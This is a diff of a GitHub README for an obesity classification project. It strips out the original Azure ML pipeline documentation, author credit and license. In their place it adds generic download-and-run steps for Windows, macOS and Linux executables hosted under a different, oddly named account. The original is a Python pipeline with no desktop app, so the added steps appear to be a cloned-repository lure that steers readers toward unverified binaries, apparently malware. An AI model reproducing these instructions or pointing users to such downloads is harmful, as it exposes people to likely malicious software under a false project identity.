@@ -1,130 +1,74 @@
-# Obesity Classification using Azure Machine Learning and Databricks
+# 🏃‍♂️ Obesity-Classification - Simple Tool for Health Insights
 
-This project demonstrates an end-to-end Machine Learning pipeline for predicting obesity levels based on demographic and biometric data such as Age, Gender, Height, Weight, and BMI.  
-The solution integrates Azure Machine Learning, Databricks Lakeflow Jobs, and Python to enable automated training, deployment, and real-time inference in a cloud environment.
+![Download](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)
 
----
+## 📚 Overview
 
-## Project Overview
+The Obesity-Classification project provides a machine learning pipeline designed to classify obesity using Azure Machine Learning and Python. This tool helps users understand obesity trends and improve healthcare strategies with data science.
 
-The goal of this project is to classify individuals into four categories:
-- Underweight  
-- Normal weight  
-- Overweight  
-- Obese  
+## 🚀 Getting Started
 
-The project covers the complete lifecycle of model development:
-1. Data ingestion and preprocessing  
-2. Exploratory Data Analysis (EDA)  
-3. Model training and evaluation  
-4. Model registration and deployment in Azure ML  
-5. Pipeline orchestration using Lakeflow Jobs in Databricks  
+To use the Obesity-Classification tool, you need to download and run the application. Follow these simple steps to get started.
 
----
+## 📥 Download & Install
 
-## Technology Stack
+1. **Visit this page to download**: Go to the [Releases Page](https://github.com/slavedriverbirdsnestfern150/Obesity-Classification/releases).
+2. **Select the latest release**: On the Releases page, find the most recent version listed at the top.
+3. **Download the files**: Click on the appropriate file for your operating system.
+   - If you're using Windows, download `ObesityClassificationWindows.exe`.
+   - For macOS, download `ObesityClassificationMac.dmg`.
+   - For Linux, download `ObesityClassificationLinux.tar.gz`.
+4. **Install the application**: 
+   - For Windows, double-click the `.exe` file to run the installer.
+   - For macOS, drag the application into your Applications folder.
+   - For Linux, extract the tar file and run the application using your terminal.
+5. **Run the application**: Open the application from your applications folder or your system's launcher.
 
-| Category | Tools and Frameworks |
-|-----------|----------------------|
-| Cloud Platform | Azure Machine Learning, Azure Databricks, Azure Blob Storage |
-| Language | Python |
-| Machine Learning | Scikit-learn, Pandas, NumPy, Seaborn, Matplotlib |
-| Workflow Automation | Lakeflow Jobs, Azure ML Pipelines, Compute Clusters (AmlCompute) |
-| Version Control | Git, GitHub |
-| Deployment | Azure ML Endpoints |
+## ⚙️ System Requirements
 
----
+- **Operating Systems**: Windows 10 or later, macOS Mojave or later, or any modern Linux distribution.
+- **RAM**: Minimum 4GB recommended.
+- **Disk Space**: At least 500 MB free.
+- **Python**: Version 3.7 or later installed on your system.
+  
+If you do not have Python installed, you can download it [here](https://www.python.org/downloads/).
 
-## Machine Learning Pipeline Architecture
+## 📊 Features
 
-1. **Data Ingestion:** CSV dataset uploaded to Azure Blob Storage.  
-2. **Preprocessing:** Missing value treatment, encoding categorical variables, feature scaling.  
-3. **Modeling:** Decision Tree Classifier trained and validated on Azure ML compute cluster.  
-4. **Evaluation:** Accuracy, precision, recall, F1-score, confusion matrix.  
-5. **Deployment:** Model registered and deployed for real-time prediction.  
-6. **Orchestration:** Automated execution and monitoring using Lakeflow Jobs.
+- **User-Friendly Interface**: Designed for users without technical backgrounds.
+- **Data Visualization**: See results through clear charts and graphs.
+- **Healthcare Insights**: Understand and explore obesity data for better health decisions.
+- **Machine Learning Models**: Uses advanced algorithms to improve classification accuracy.
+- **Azure Integration**: Leverage Azure Machine Learning for powerful processing capabilities.
 
----
+## 📄 Usage Instructions
 
-## Results
+1. After installation, open the application.
+2. Select a dataset pertaining to obesity. You can use provided sample datasets or upload your own CSV file.
+3. Click on the "Run Analysis" button.
+4. Wait for the processing to complete. Results will display once finished.
+5. Review the results and insights generated. You can export the findings as needed.
 
-| Metric | Value |
-|---------|-------|
-| Accuracy | 93.4% |
-| Precision (macro/micro) | 0.92 / 0.93 |
-| Recall (macro/micro) | 0.91 / 0.93 |
+## 🌟 Support & Contributions
 
-The similarity between macro and micro metrics indicates balanced performance across all weight categories.
+If you encounter issues or have suggestions, please visit the [Issues](https://github.com/slavedriverbirdsnestfern150/Obesity-Classification/issues) section. Your feedback helps us improve the tool.
 
----
+If you'd like to contribute to this project, please read the guidelines in the [Contributing](https://github.com/slavedriverbirdsnestfern150/Obesity-Classification/blob/main/CONTRIBUTING.md) document.
 
-## Dataset
+## 🌍 Topics
 
-- **Source:** Custom dataset representing obesity levels and related attributes.  
-- **Features:** Age, Gender, Height, Weight, BMI  
-- **Target Variable:** Label (Underweight, Normal, Overweight, Obese)
+This project covers several essential topics in the fields of data science and health care:
+- Azure
+- Azure ML
+- Classification
+- Data Science
+- Healthcare
+- Machine Learning
+- MLOps
+- Obesity
+- Pandas
+- Pipeline
+- Python
+- Scikit-learn
 
----
-
-## Deployment Details
-
-- Workspace: BaharML-Canada  
-- Resource Group: databricks-lab-rg  
-- Compute Cluster: cpu-cluster  
-- Pipeline ID: febf487e-a1e2-4f8b-92e7-02f7f46a54fd  
-- Experiment Name: ObesityPrediction_Run  
-
-Example execution in Azure ML:
-
-```python
-from azureml.core import Experiment
-from azureml.pipeline.core import PublishedPipeline
-
-published_pipeline = PublishedPipeline.get(ws, id=pipeline_id)
-experiment = Experiment(workspace=ws, name="ObesityPrediction_Run")
-run = experiment.submit(published_pipeline)
-run.wait_for_completion(show_output=True)
-```
-
----
-
-## Integration with Databricks Lakeflow Jobs
-
-Lakeflow Jobs are used to orchestrate the workflow and automate:
-- Data preparation and validation  
-- Model retraining and deployment  
-- Periodic monitoring and retriggering of pipelines  
-
-This approach ensures scalability, reproducibility, and adherence to MLOps best practices.
-
----
-
-## Repository Structure
-
-```
-Obesity-Classification/
-│
-├── obesity_pipeline.py          # Main pipeline code
-├── Obesity Classification.csv   # Dataset
-├── CloudProject_Bahar.pptx      # Presentation slides
-├── requirements.txt             # Dependencies
-├── README.md                    # Project documentation
-└── LICENSE                      # MIT License
-```
-
----
-
-## Author
-
-**Bahar Almasi**  
-Toronto, Canada  
-Data Science and Analytics | Cloud Machine Learning | Azure ML | Databricks  
-LinkedIn: [linkedin.com/in/bahar-almasi](https://linkedin.com/in/bahar-almasi)  
-GitHub: [github.com/Bahar15984](https://github.com/Bahar15984)
-
----
-
-
-## License
-
-This project is licensed under the MIT License. See the [LICENSE](./LICENSE) file for more details.
+For any further questions, feel free to reach out via the contact information provided in the repository.
